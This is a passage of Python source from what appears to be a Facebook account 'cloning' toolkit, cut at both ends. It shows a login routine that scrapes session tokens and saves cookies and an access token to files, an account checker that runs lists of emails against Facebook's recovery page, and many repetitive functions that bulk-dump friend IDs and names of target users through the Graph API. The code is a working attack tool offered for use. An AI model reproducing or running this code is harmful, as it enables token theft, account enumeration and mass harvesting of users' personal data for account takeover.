		pw=input("[*] Account Password : ")
	except:
		user=input("\n[*] Email or User ID : ")
		pw=input("[*] Account Password : ")
	try:
		_head={
			'Host':'m.facebook.com',
				'cache-control':'max-age=0',
			'upgrade-insecure-requests':'1',
				'user-agent':_agent,
			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'sec-fetch-mode':'navigate',
				'sec-fetch-user':'?1',
			'sec-fetch-dest':'document',
				'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		try:
			r=_ses.get("https://m.facebook.com/", headers=_head).text.encode('utf-8')
		except:
			r=_ses.get("https://m.facebook.com/", headers=_head).text
		_head2={
			'Host':'m.facebook.com',
				'user-agent':_agent,
			'content-type':'application/x-www-form-urlencoded',
				'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(r)).group(1),
			'accept':'*/*',
				'origin':'https://m.facebook.com',
			'sec-fetch-site':'same-origin',
				'sec-fetch-mode':'cors',
			'sec-fetch-dest':'empty',
				'referer':'https://m.facebook.com/',
			'accept-encoding':'gzip, deflate',
				'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		payload={
			"fb_dtsg":re.search('{"token":"(.*?)"', str(r)).group(1).encode('utf-8'),
				"lsd":re.search('name="lsd" value="(.*?)"', str(r)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(r)).group(1),
				"m_ts":re.search('name="m_ts" value="(.*?)"', str(r)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(r)).group(1),
				"try_number":"0",
			"unrecognized_tries":"0",
				"prefill_contact_point":user,
			"prefill_source":"browser_dropdown",
				"prefill_type":"contact_point",
			"first_prefill_source":"browser_dropdown",
				"first_prefill_type":"contact_point",
			"had_cp_prefilled":True,
				"had_password_prefilled":False,
			"is_smart_lock":False,
				"bi_xrwh":"0",
			"__dyn":"",
				"__csr":"",
			"__req":"2",
				"__a":"",
			"__user":"0",
				"email":user,
			"encpass":"#PWD_BROWSER:0:"+real_time()+":"+pw
		}
		_ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", headers=_head2, data=payload)
		cok=_ses.cookies.get_dict()
		if 'c_user' in (cok):
			_head={
				'Host':'business.facebook.com',
					'cache-control':'max-age=0',
				'upgrade-insecure-requests':'1',
					'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
				'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
					'content-type' : 'text/html; charset=utf-8',
				'accept-encoding':'gzip, deflate',
					'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}    
			_r=_ses.get(urls, headers=_head)
			_p=re.search('(EAAG\w+)', _r.text)
			_token=_p.group(1)
			if 'EAA' in _token:
				print('\n[*] Cookie : '+convert(cok))
				open("cookie.txt", 'a').write(convert(cok))
				print('\n[*] Token  : '+_token )
				open("token.txt", 'a').write(_token)
				print('')
				exit()
		elif 'checkpoint' in (cok):
			exit('[*] Your Account Is On Check-Point ')
		else:
			print('\n[*] Wrong Username Or Password ')
			time.sleep(3)
			fb_menu()
	except AttributeError:
		print('\n[*] Wrong Username Or Password')
		time.sleep(3)
		fb_menu()
def auto_token():
	print("\n\n[01] Free Facebook ID Token X1")
	print("[02] Free Facebook ID Token X2")
	print("[03] Free Facebook ID Token X3")
	print("[04] Free Facebook ID Token X4")
	print("[05] Free Facebook ID Token XX [ Pro ] ")
	token_xx = input("\n[>>] Choose : ")
	if token_xx in ["1","01"]:
		auto_token_x1()
	elif token_xx in ["2","02"]:
		auto_token_x2()
	elif token_xx in ["3","03"]:
		auto_token_x3()
	elif token_xx in ["4","04"]:
		auto_token_x4()
	elif token_xx in ["5","05"]:
		auto_token_x5()
	else:
		fb_menu()
def fb_acc_chacker():
	mupfile = input('\n[>>] Mail or Username List : ')
	print("")
	usr = open(mupfile, 'r')
	for user in usr:
		print("\x1b[1;97m[->] " + str(user.strip()) + " ", end='')
		br = mechanize.Browser()
		br.set_handle_robots(False)
		br._factory.is_html = True
		br.addheaders=[('User-agent','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24')]
		br.open('https://mbasic.facebook.com/login/identify/')
		br.select_form(nr=0)
		br.form['email'] = user
		br.method = "POST"
		reslink = br.submit().geturl()
		if 'identify' in reslink:
			print('\x1b[1;91m>> FB Account Not Found')
		else:
			print('\x1b[1;92m>> FB Account Found ')
	input("\n\n[*] Back ")
	fb_menu()
def fb_single_dump():
	logo()
	try:
		___token___ = open('Cloning/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	for zx in range(___total___):
		zx +=1
		___ids___ = input("[>>] Public User ID : ")
		if ___ids___ in ['',' ']:
			fb_menu()
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
			file = open('Cloning/Facebook/Dump/'+___file___+'.txt' , 'a')
			file2 = ('Cloning/Facebook/Dump/'+___file___+'.txt')
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Cloning/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_x2_dump():
	logo()
	try:
		___token___ = open('Cloning/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Cloning/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Cloning/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Cloning/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_3x_dump():
	logo()
	try:
		___token___ = open('Cloning/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Cloning/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Cloning/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		___ids3___ = input("[>>] Public User ID 03 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids3___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Cloning/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_x5_dump():
	logo()
	try:
		___token___ = open('Cloning/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Cloning/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Cloning/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		___ids3___ = input("[>>] Public User ID 03 : ")
		___ids4___ = input("[>>] Public User ID 04 : ")
		___ids5___ = input("[>>] Public User ID 05 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids3___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids4___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids5___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Cloning/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_x8_dump():
	logo()
	try:
		___token___ = open('Cloning/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Cloning/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Cloning/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		___ids3___ = input("[>>] Public User ID 03 : ")
		___ids4___ = input("[>>] Public User ID 04 : ")
		___ids5___ = input("[>>] Public User ID 05 : ")
		___ids6___ = input("[>>] Public User ID 06 : ")
		___ids7___ = input("[>>] Public User ID 07 : ")
		___ids8___ = input("[>>] Public User ID 08 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids3___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids4___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids5___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids6___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids7___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids8___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Cloning/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_x10_dump():
	logo()
	try:
		___token___ = open('Cloning/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Cloning/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Cloning/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		___ids3___ = input("[>>] Public User ID 03 : ")
		___ids4___ = input("[>>] Public User ID 04 : ")
		___ids5___ = input("[>>] Public User ID 05 : ")
		___ids6___ = input("[>>] Public User ID 06 : ")
		___ids7___ = input("[>>] Public User ID 07 : ")
		___ids8___ = input("[>>] Public User ID 08 : ")
		___ids9___ = input("[>>] Public User ID 09 : ")
		___ids10___ = input("[>>] Public User ID 10 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids3___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids4___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids5___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids6___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids7___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids8___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids9___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids10___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Cloning/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_x15_dump():
	logo()
	try:
		___token___ = open('Cloning/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Cloning/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Cloning/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		___ids3___ = input("[>>] Public User ID 03 : ")
		___ids4___ = input("[>>] Public User ID 04 : ")
		___ids5___ = input("[>>] Public User ID 05 : ")
		___ids6___ = input("[>>] Public User ID 06 : ")
		___ids7___ = input("[>>] Public User ID 07 : ")
		___ids8___ = input("[>>] Public User ID 08 : ")
		___ids9___ = input("[>>] Public User ID 09 : ")
		___ids10___ = input("[>>] Public User ID 10 : ")
		___ids11___ = input("[>>] Public User ID 11 : ")
		___ids12___ = input("[>>] Public User ID 12 : ")
		___ids13___ = input("[>>] Public User ID 13 : ")
		___ids14___ = input("[>>] Public User ID 14 : ")
		___ids15___ = input("[>>] Public User ID 15 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids3___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids4___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids5___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids6___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids7___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids8___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids9___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids10___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids11___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids12___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids13___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids14___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids15___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Cloning/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_x20_dump():
	logo()
	try:
		___token___ = open('Cloning/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Cloning/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Cloning/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		___ids3___ = input("[>>] Public User ID 03 : ")
		___ids4___ = input("[>>] Public User ID 04 : ")
		___ids5___ = input("[>>] Public User ID 05 : ")
		___ids6___ = input("[>>] Public User ID 06 : ")
		___ids7___ = input("[>>] Public User ID 07 : ")
		___ids8___ = input("[>>] Public User ID 08 : ")
		___ids9___ = input("[>>] Public User ID 09 : ")
		___ids10___ = input("[>>] Public User ID 10 : ")
		___ids11___ = input("[>>] Public User ID 11 : ")
		___ids12___ = input("[>>] Public User ID 12 : ")
		___ids13___ = input("[>>] Public User ID 13 : ")
		___ids14___ = input("[>>] Public User ID 14 : ")
		___ids15___ = input("[>>] Public User ID 15 : ")
		___ids16___ = input("[>>] Public User ID 16 : ")
		___ids17___ = input("[>>] Public User ID 17 : ")
		___ids18___ = input("[>>] Public User ID 18 : ")
		___ids19___ = input("[>>] Public User ID 19 : ")
		___ids20___ = input("[>>] Public User ID 20 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids3___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids4___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids5___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids6___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids7___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids8___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids9___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids10___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids11___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids12___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids13___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids14___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids15___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids16___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids17___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids18___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids19___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids20___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			file.close()
			___user___ = open('Cloning/Facebook/Dump/'+___file___+'.txt','r').readlines()
			print("[*] Total File ID : %s"%(len(___user___)))
			print("[*] Duming Successful ")
			print("[*] Dump File Save As : %s"%(file2))
			input("\n\n[*] Back")
			fb_menu()
		except:
			print("\n\n\033[0;91m[*] Dumping Error ")
			time.sleep(3)
			fb_menu()
def fb_x25_dump():
	logo()
	try:
		___token___ = open('Cloning/Facebook/Data/fb_token.txt','r').read()
	except:
		login()
	___total___ = 1
	___file___ = input("[>>] File Name : ")
	file = open('Cloning/Facebook/Dump/'+___file___+'.txt' , 'a')
	file2 = ('Cloning/Facebook/Dump/'+___file___+'.txt')
	for zx in range(___total___):
		zx +=1
		___ids___ = input("\n[>>] Public User ID 01 : ")
		___ids2___ = input("[>>] Public User ID 02 : ")
		___ids3___ = input("[>>] Public User ID 03 : ")
		___ids4___ = input("[>>] Public User ID 04 : ")
		___ids5___ = input("[>>] Public User ID 05 : ")
		___ids6___ = input("[>>] Public User ID 06 : ")
		___ids7___ = input("[>>] Public User ID 07 : ")
		___ids8___ = input("[>>] Public User ID 08 : ")
		___ids9___ = input("[>>] Public User ID 09 : ")
		___ids10___ = input("[>>] Public User ID 10 : ")
		___ids11___ = input("[>>] Public User ID 11 : ")
		___ids12___ = input("[>>] Public User ID 12 : ")
		___ids13___ = input("[>>] Public User ID 13 : ")
		___ids14___ = input("[>>] Public User ID 14 : ")
		___ids15___ = input("[>>] Public User ID 15 : ")
		___ids16___ = input("[>>] Public User ID 16 : ")
		___ids17___ = input("[>>] Public User ID 17 : ")
		___ids18___ = input("[>>] Public User ID 18 : ")
		___ids19___ = input("[>>] Public User ID 19 : ")
		___ids20___ = input("[>>] Public User ID 20 : ")
		___ids21___ = input("[>>] Public User ID 21 : ")
		___ids22___ = input("[>>] Public User ID 22 : ")
		___ids23___ = input("[>>] Public User ID 23 : ")
		___ids24___ = input("[>>] Public User ID 24 : ")
		___ids25___ = input("[>>] Public User ID 25 : ")
		try:
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000000)&access_token=%s"%(___ids___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids2___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids3___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids4___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids5___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids6___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids7___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids8___,___token___)).json()
			for a in rex['friends']['data']:
				file.write(a['id']+"|"+a['name']+'\n')
			rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(500000)&access_token=%s"%(___ids9___,___token___)).json()
			for a in rex['friends']['data']:
